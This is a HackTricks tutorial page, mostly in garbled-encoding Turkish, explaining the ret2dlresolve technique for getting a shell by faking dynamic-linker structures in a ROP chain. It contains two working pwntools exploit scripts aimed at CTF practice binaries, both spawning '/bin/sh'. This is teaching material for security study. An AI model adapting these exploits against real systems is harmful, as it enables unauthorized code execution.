# Ret2dlresolve

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek destek olun.

</details>

## Temel Bilgiler

[**GOT/PLT**](../arbitrary-write-2-exec/aw2exec-got-plt.md) ve [**Relro**](../common-binary-protections-and-bypasses/relro.md) sayfasÄ±nda aÃ§Ä±klandÄ±ÄŸÄ± gibi, Full Relro olmayan ikili dosyalar, dÄ±ÅŸ kÃ¼tÃ¼phanelere adresler gibi sembolleri ilk kullandÄ±klarÄ±nda Ã§Ã¶zerler. Bu Ã§Ã¶zÃ¼mleme, **`_dl_runtime_resolve`** iÅŸlevini Ã§aÄŸÄ±rarak gerÃ§ekleÅŸir.

**`_dl_runtime_resolve`** iÅŸlevi, belirtilen sembolÃ¼ **Ã§Ã¶zmek** iÃ§in gereken bazÄ± yapÄ±larÄ±n referanslarÄ±nÄ± yÄ±ÄŸÄ±ndan alÄ±r.

Bu nedenle, istenen sembolÃ¼ (Ã¶rneÄŸin **`system`** iÅŸlevi) Ã§Ã¶zmek ve yapÄ±landÄ±rÄ±lmÄ±ÅŸ bir parametre ile Ã§aÄŸÄ±rmak iÃ§in **tÃ¼m bu yapÄ±larÄ±n sahte oluÅŸturulmasÄ± mÃ¼mkÃ¼ndÃ¼r** (Ã¶rneÄŸin **`system('/bin/sh')`**).

Genellikle, tÃ¼m bu yapÄ±lar, yazÄ±labilir bir bellek Ã¼zerinde **`read`** Ã§aÄŸrÄ±sÄ± yaparak baÅŸlangÄ±Ã§ ROP zinciri oluÅŸturularak sahte edilir, ardÄ±ndan yapÄ±lar ve dize **`'/bin/sh'`** okunarak bilinen bir konumda depolanÄ±r ve ardÄ±ndan ROP zinciri, **`_dl_runtime_resolve`**'Ä± Ã§aÄŸÄ±rarak devam eder, sahte yapÄ±lar iÃ§inde **`system`** adresini Ã§Ã¶zerek ve bu adresi **`'/bin/sh'`** adresi ile Ã§aÄŸÄ±rarak.

{% hint style="success" %}
Bu teknik Ã¶zellikle sistem Ã§aÄŸrÄ± cihazlarÄ±nÄ±n olmadÄ±ÄŸÄ± durumlarda (Ã¶rneÄŸin [**ret2syscall**](rop-syscall-execv/) veya [SROP](srop-sigreturn-oriented-programming/) gibi teknikleri kullanmak iÃ§in) ve libc adreslerini sÄ±zdÄ±rmak iÃ§in yollar olmadÄ±ÄŸÄ±nda kullanÄ±ÅŸlÄ±dÄ±r.
{% endhint %}

Bu tekniÄŸe iliÅŸkin daha iyi bir aÃ§Ä±klamayÄ± aÅŸaÄŸÄ±daki videonun ikinci yarÄ±sÄ±nda bulabilirsiniz:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## YapÄ±lar

**`JMPREL`**, **`STRTAB`** ve **`SYMTAB`** olmak Ã¼zere 3 yapÄ±yÄ± sahte oluÅŸturmak gereklidir. Bu yapÄ±larÄ±n nasÄ±l oluÅŸturulduÄŸu hakkÄ±nda daha iyi bir aÃ§Ä±klamayÄ± [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures) adresinde bulabilirsiniz.

## SaldÄ±rÄ± Ã–zeti

1. Sahte yapÄ±larÄ± bir yere yazÄ±n
2. System'Ä±n ilk argÃ¼manÄ±nÄ± ayarlayÄ±n (`$rdi = &'/bin/sh'`)
3. YÄ±ÄŸÄ±nda yapÄ±larÄ± Ã§aÄŸÄ±rmak iÃ§in adresleri ayarlayÄ±n **`_dl_runtime_resolve`**
4. **`_dl_runtime_resolve`**'Ä± **Ã§aÄŸÄ±rÄ±n**
5. **`system`**, `'/bin/sh'` argÃ¼manÄ± ile Ã§Ã¶zÃ¼lecek ve Ã§aÄŸrÄ±lacaktÄ±r

## Ã–rnek

### Saf Pwntools

Bu tekniÄŸin [**Ã¶rneÄŸini burada bulabilirsiniz**](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation) **son ROP zincirinin Ã§ok iyi bir aÃ§Ä±klamasÄ±nÄ± iÃ§erir**, ancak burada kullanÄ±lan son saldÄ±rÄ± ÅŸu ÅŸekildedir:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
rop = ROP(elf)

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * 76)
rop.read(0, dlresolve.data_addr) # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset

log.info(rop.dump())

p.sendline(rop.chain())
p.sendline(dlresolve.payload)    # now the read is called and we pass all the relevant structures in

p.interactive()
```
### Ham

--- 

#### Dynamic Linker Resolver

Dynamic Linker Resolver (DL Resolver) is a technique used to resolve functions from shared libraries at runtime. This technique can be used in Return-Oriented Programming (ROP) to call functions from shared libraries without directly calling them. The DL Resolver can be used to bypass address space layout randomization (ASLR) and execute arbitrary code by resolving and calling functions from shared libraries.
```python
# Code from https://guyinatuxedo.github.io/18-ret2_csu_dl/0ctf18_babystack/index.html
# This exploit is based off of: https://github.com/sajjadium/ctf-writeups/tree/master/0CTFQuals/2018/babystack

from pwn import *

target = process('./babystack')
#gdb.attach(target)

elf = ELF('babystack')

# Establish starts of various sections
bss = 0x804a020

dynstr = 0x804822c

dynsym = 0x80481cc

relplt = 0x80482b0

# Establish two functions

scanInput = p32(0x804843b)
resolve = p32(0x80482f0) #dlresolve address

# Establish size of second payload

payload1_size = 43

# Our first scan
# This will call read to scan in our fake entries into the plt
# Then return back to scanInput to re-exploit the bug

payload0 = ""

payload0 += "0"*44                        # Filler from start of input to return address
payload0 += p32(elf.symbols['read'])    # Return read
payload0 += scanInput                    # After the read call, return to scan input
payload0 += p32(0)                        # Read via stdin
payload0 += p32(bss)                    # Scan into the start of the bss
payload0 += p32(payload1_size)            # How much data to scan in

target.send(payload0)

# Our second scan
# This will be scanned into the start of the bss
# It will contain the fake entries for our ret_2_dl_resolve attack

# Calculate the r_info value
# It will provide an index to our dynsym entry
dynsym_offset = ((bss + 0xc) - dynsym) / 0x10
r_info = (dynsym_offset << 8) | 0x7

# Calculate the offset from the start of dynstr section to our dynstr entry
dynstr_index = (bss + 28) - dynstr

paylaod1 = ""

# Our .rel.plt entry
paylaod1 += p32(elf.got['alarm'])
paylaod1 += p32(r_info)

# Empty
paylaod1 += p32(0x0)

# Our dynsm entry
paylaod1 += p32(dynstr_index)
paylaod1 += p32(0xde)*3

# Our dynstr entry
paylaod1 += "system\x00"

# Store "/bin/sh" here so we can have a pointer ot it
paylaod1 += "/bin/sh\x00"

target.send(paylaod1)

# Our third scan, which will execute the ret_2_dl_resolve
# This will just call 0x80482f0, which is responsible for calling the functions for resolving
# We will pass it the `.rel.plt` index for our fake entry
# As well as the arguments for system

# Calculate address of "/bin/sh"
binsh_bss_address = bss + 35

# Calculate the .rel.plt offset
ret_plt_offset = bss - relplt


paylaod2 = ""

paylaod2 += "0"*44
paylaod2 += resolve                 # 0x80482f0
paylaod2 += p32(ret_plt_offset)        # .rel.plt offset
paylaod2 += p32(0xdeadbeef)            # The next return address after 0x80482f0, really doesn't matter for us
paylaod2 += p32(binsh_bss_address)    # Our argument, address of "/bin/sh"

target.send(paylaod2)

# Enjoy the shell!
target.interactive()
```
## DiÄŸer Ã–rnekler ve Referanslar

* [https://youtu.be/ADULSwnQs-s](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve)
* [https://guyinatuxedo.github.io/18-ret2\_csu\_dl/0ctf18\_babystack/index.html](https://guyinatuxedo.github.io/18-ret2\_csu\_dl/0ctf18\_babystack/index.html)
* 32 bit, relro olmayan, canary olmayan, nx, pie olmayan, temel kÃ¼Ã§Ã¼k buffer overflow ve return. SÃ¶mÃ¼rmek iÃ§in bof, `read`'i tekrar Ã§aÄŸÄ±rmak iÃ§in kullanÄ±lÄ±r, `.bss` bÃ¶lÃ¼mÃ¼ ve daha bÃ¼yÃ¼k bir boyutta, `dlresolve` sahte tablolarÄ± yÃ¼klemek iÃ§in `system`'i yÃ¼klemek iÃ§in ana dÃ¶nÃ¼ÅŸ ve baÅŸlangÄ±Ã§taki bof'u tekrar kÃ¶tÃ¼ye kullanmak iÃ§in dlresolve'u Ã§aÄŸÄ±rmak ve ardÄ±ndan `system('/bin/sh')`'i Ã§aÄŸÄ±rmak iÃ§in kullanÄ±lÄ±r.
